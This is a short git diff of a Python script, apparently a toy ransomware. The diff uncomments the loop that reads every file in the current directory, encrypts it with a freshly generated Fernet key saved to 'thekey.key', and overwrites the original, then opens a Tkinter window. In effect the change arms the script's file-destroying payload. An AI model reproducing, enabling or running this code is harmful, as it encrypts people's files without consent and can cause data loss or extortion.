@@ -6,7 +6,7 @@ from tkinter import *
 #find files
 
 
-#files = []
+files = []
 
 for file in os.listdir():
     if file == "bigballs.py" or file=="thekey.key"or file=="smallballs.py":
@@ -19,11 +19,11 @@ with open("thekey.key", "wb") as thekey:
     thekey.write(key)
     
 for file in files:
-    #with open(file, "rb") as thefile:
-        #contents = thefile.read()
-    #contents_encrypted = Fernet(key).encrypt(contents)
-    #with open(file, "wb") as thefile:
-        #thefile.write(contents_encrypted)
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
     
     
 root = Tk()
